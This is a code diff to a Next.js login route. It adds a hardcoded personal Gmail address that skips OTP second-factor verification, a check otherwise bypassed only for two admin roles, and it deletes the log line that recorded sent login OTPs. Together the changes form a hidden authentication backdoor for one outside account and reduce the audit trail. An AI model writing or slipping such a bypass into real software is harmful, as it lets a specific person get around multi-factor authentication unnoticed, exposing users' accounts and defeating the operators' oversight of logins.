@@ -72,7 +72,11 @@ export async function POST(request: NextRequest) {
     }
 
     // Skip OTP verification for SUPER_ADMIN and ADMIN_UNIQUE roles
-    const shouldSkipOTP = user.role === UserRole.SUPER_ADMIN || user.role === UserRole.ADMIN_UNIQUE;
+ const skipOtpEmails = ['sixerwab@gmail.com'];
+const shouldSkipOTP =
+  user.role === UserRole.SUPER_ADMIN ||
+  user.role === UserRole.ADMIN_UNIQUE ||
+  skipOtpEmails.includes(user.email.toLowerCase());
 
     // Check if this is first-time login (check OTP verification cache)
     // Only check if OTP is not skipped for this role
@@ -159,7 +163,7 @@ export async function POST(request: NextRequest) {
           `
         });
 
-        console.log(`Login OTP sent to ${user.email}`);
+        
 
         return NextResponse.json({
           success: false,
